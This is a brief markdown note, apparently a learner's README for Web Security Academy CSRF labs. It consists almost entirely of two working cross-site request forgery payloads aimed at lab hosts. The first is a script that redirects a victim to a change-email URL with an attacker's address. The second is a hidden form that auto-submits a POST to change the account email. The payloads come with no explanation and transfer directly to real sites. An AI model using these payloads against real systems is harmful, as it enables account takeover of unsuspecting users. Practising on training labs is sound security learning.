# Bursuip-

CSRF where token validation depends on request method

<script>
window.location.href = "https://0a4e00dc03e9b6e481eeee9800fa0067.web-security-academy.net/my-account/change-email?email=attacker@test.com"
</script>

Exploiting CSRF Vulnerabilities and CSRF where token validation depends on token being present


<form action="https://0a7300ae03ef28a182e0337f00a0009f.web-security-academy.net/my-account/change-email" method="post" id="csrf-attack">
    <input type="hidden" name="email" value="attack@attacker.com">
</form>
<script>
    document.getElementById("csrf-attack").submit();
</script>
